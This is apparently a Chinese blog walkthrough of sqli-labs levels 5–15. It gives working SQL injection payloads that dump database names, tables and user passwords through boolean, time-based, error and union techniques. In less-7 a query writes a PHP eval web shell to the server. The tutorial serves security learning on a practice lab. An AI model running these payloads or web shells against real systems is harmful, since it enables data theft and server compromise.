+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br></code></pre></td></tr></table></figure>
+<p>利用页面内容的显示和不显示，来判断我们查询的内容是什么。将我们想要查询的内容进行拆分，然后逐个判断。例如：想要知道数据库名，我们可以先询问系统：“第一个字符是不是a？”，如果不是，就继续询问是否为b，直到问出结果。然后再去寻找第二个字符。</p>
+<p>常用的函数：</p>
+<ul>
+<li>substr(string string,num start,num length);<br>string为字符串；start为起始位置；length为长度。（mysql中的start是从1开始的）</li>
+<li>left()(str,length);str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;a&quot;</span>  --+<br># 不显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;s&quot;</span>  --+<br># 正常显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-string">&quot;security&quot;</span>  --+<br># 正常显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>  --+<br># 正常显示<br><br></code></pre></td></tr></table></figure>
+我们将中间的database()，替换成其他的SQL语句就可以查询其他的结果了。</li>
+</ul>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>时间盲注通常在看不到任何回显信息的时候尝试，时间盲注是在布尔注入的基础上的。布尔注入是利用网站自带的回显，而时间注入则是将 true 和 false 转化为不同的等待时间。直接修改上面的 Payload 可得：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and if(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)  --+<br># 有明显的延时<br><br></code></pre></td></tr></table></figure>
+
+<p>简单分析：<br>这个 lession 和前面的不同点在于回显方式。这个 lession 并不会像先前一样，显示并返回查询到的信息，而是告诉你是否正确。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br>$result=mysqli_query($con1, $sql);<br>$row = mysqli_fetch_array($result, MYSQLI_BOTH);<br><br><br>    <span class="hljs-keyword">if</span>($row)<br>    &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;    <br>      <span class="hljs-comment">// 关键语句</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    print_r(mysqli_error($con1));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;    <br>    <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>闭合方式:<code>id=&quot;$id&quot;</code></p>
+<p>测试闭合方式：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; --+<br><span class="hljs-comment"># 正常显示（）</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br></code></pre></td></tr></table></figure>
+<p>将 and 后的式子替换为 less-5 中的报错注入、布尔注入和时间注入即可。</p>
+<hr>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">?id=1&#x27;)) --+</span><br><span class="xml"># 闭合SQL语句</span><br><br><span class="xml">?id=1&#x27;)) union select 1, 2, &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;pwd&quot;</span>]) <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;--+</span><br><span class="xml"># 会将查询结果保存到服务器端的目录下。可以考虑写入服务器后台</span><br><br></code></pre></td></tr></table></figure>
+<p>最后使用蚁剑进行连接即可 getshell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8F46C7D8-A92A-4165-BBD9-4C81A65E76F7.png" srcset="/img/loading.gif"></p>
+<hr>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>和前面几题不同点在于：不输出报错信息。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0--+<br><span class="hljs-comment"># 不显示</span><br><br><span class="hljs-comment"># 考虑参考less-5中的布尔注入进行测试</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;a&quot;</span>  --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;s&quot;</span>  --+<br><span class="hljs-comment"># 正常显示，修改函数的内容，即可得到后面的内容</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>无论怎么输入都是返回 You are in……。考虑使用时间盲注</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># 使用--+或者%23，如果使用#浏览器可能不进行url编码</span><br><br></code></pre></td></tr></table></figure>
+<p>此处id=1，并且发现有延时。</p>
+<p>这里依然考虑使用 if 语句来进行时间盲注（if 语句挺像C语言的三目运算符的）。类似前面的方法，使用 if+sleep 来先获取数据库名字的长度</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># <span class="hljs-number">1.</span> 二分<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 延时，正常执行<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 不延时<br># 用来测试if语句是否正常执行<br><br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">10</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 不延时<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">5</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 延时，代表在 <span class="hljs-number">5</span>, <span class="hljs-number">10</span> 之间<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 不延时，在 [<span class="hljs-number">8</span>, <span class="hljs-number">5</span>)<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 延时，长度为<span class="hljs-number">8</span><br><br>#<span class="hljs-number">2.</span> 逐个测试<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">1</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">2</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br><br></code></pre></td></tr></table></figure>
+
+<p>LEFT(str,len) 返回最左边的 len 个字符的字符串，或者 NULL。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5);<br><span class="hljs-code">+----------------------+</span><br>| left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5) |<br><span class="hljs-code">+----------------------+</span><br>| fooba                |<br><span class="hljs-code">+----------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure>
+<p>使用 left 来爆破数据库的名字</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>a<span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;b&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>……<br>……<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>s<span class="hljs-string">&#x27;, sleep(3), 1) --+ # 明显延时</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;sa&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br>……<br>……<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 2)=&#x27;</span>s<span class="hljs-string">e&#x27;, sleep(3), 1) --+ </span><br><span class="hljs-string"></span><br><span class="hljs-string"># 类似上面的方法，慢慢的增加长度，修改需要对比的字符串，可以得到完整的数据库名</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;security&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ # 明显延时</span><br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>爆表名的 Payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27; and if(left((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> , <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>需要注意：limit N,M : 相当于 limit M offset N , 从第 N 条记录开始（从0开始）, 返回 M 条记录。这里使用的limit x,1 查询第x个表名。</p>
+</li>
+<li><p>爆字段名的 Payload</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 4,1),8)=&#x27;</span><span class="hljs-keyword">password</span><span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">9</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;username&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li>
+<li><p>爆数据的payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br><br></code></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<hr>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
+<p>将单引号改为双引号即可，其他相同。</p>
+<hr>
+<h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>11 到 21 关都是 POST 型，使用 Hackbar 可以方便的发送 POST 数据</p>
+<ul>
+<li>Chrome 有免费的 Hackbar</li>
+<li>firefox 的 Hackbar 可以考虑用这个项目：<a target="_blank" rel="noopener" href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li>
+</ul>
+<p>基本操作：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B152DCD1-244C-418E-B784-37A5A28A0280.png" srcset="/img/loading.gif"><br>enctype 属性：规定在发送到服务器之前应该如何对表单数据进行编码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114174430.png" srcset="/img/loading.gif"></p>
+<hr>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
+<p>当我尝试使用 Hackbar 提交表单，Hackbar 给出 form.submit is not a function 的错误信息。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C3EB6EAC-10A7-43B1-8C43-7E168C81A664.png" srcset="/img/loading.gif"><br>解决方法：将表单中的 &amp;submit=Submit 删掉。</p>
+<p>后面按照回显方式的由易到难进行测试，这题能正常回显用户名和密码，说明可以正常使用联合注入进行回显。</p>
+<ul>
+<li><p>联合注入 Payload。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><br>passwd=D&amp;uname=Dum&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li>
+<li><p>报错注入Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据库版本</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据库名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 表名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 字段名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,password) from users),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据</span><br><br></code></pre></td></tr></table></figure>
+<p>得到回显XPATH syntax error: ‘<del>8.0.19</del>‘，即可以进行报错注入，爆破信息同上面的方法。</p>
+</li>
+<li><p>布尔注入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+ # 正常登陆<br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2--+ # 登陆错误<br><br></code></pre></td></tr></table></figure>
+<p>这里非常类似前面 GET 的基于布尔的字符型注入。延时注入是基于布尔注入的，当界面无法进行回显的时候才会考虑使用延时注入。</p>
+</li>
+</ul>
+<hr>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>闭合方式：<code>password=(&#39;$passwd&#39;)</code></p>
+<p>类似上题只使用一个单引号进行闭合，来观察报错信息，根据报错信息来进行注入。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><br></code></pre></td></tr></table></figure>
+<p>就能看到如下报错信息<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B22699CD-05DD-41B8-A46E-19C3EB9BE8ED.png" srcset="/img/loading.gif"><br>可以从上图看到，在单引号之后有一个单引号和括号，说明这题需要使用括号。</p>
+<p>再次尝试闭合SQL语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  --+<br><br></code></pre></td></tr></table></figure>
+<p>正常登陆后，这题并没有显示查询结果，只是显示你是否登陆，所以不能使用联合注入。</p>
+<p>尝试报错注入（报错注入通过报错信息进行回显）。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, (select database()), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure>
+<p>根据回显结果可以看出：该题能正常回显报错信息，即可以进行报错注入。</p>
+<p>尝试时间盲注。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and if(left(database(), <span class="hljs-number">1</span>)=&#x27;s&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure>
+<p>能发现有明显的等待，即可以进行时间盲注。</p>
+<hr>
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>闭合方式：<code>password=&quot;$passwd&quot;</code></p>
+<p>类似前面的步骤进行测试。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure>
+<p>可以通过 报错信息观察到 SQL 语句的局部，通过局部来推测自己的SQL应该如何写。</p>
+<p>报错注入 Payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure>
+
+<p>时间盲注 Payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(database())=8, sleep(3), 1)--+<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式：<code>password=&#39;$passwd&#39;</code></p>
+<p>尝试使用前面的步骤回显出 SQL 语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure>
+<p>没有回显报错信息，而且都登陆失败，猜测可能关闭和报错的输出</p>
+<p>尝试直接注释，如果能SQL注入，那么用户名正确就能登陆系统。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;  --+<br><br></code></pre></td></tr></table></figure>
+<p>登陆成功。</p>
+<p>我们可以在后面拼接 and，and 之后的值为 true 就会正常登陆，值为 false 就登陆失败。（我们拼接的 SQL 语句都在 where 后，where 语句的功能就是根据布尔值进行筛选）</p>
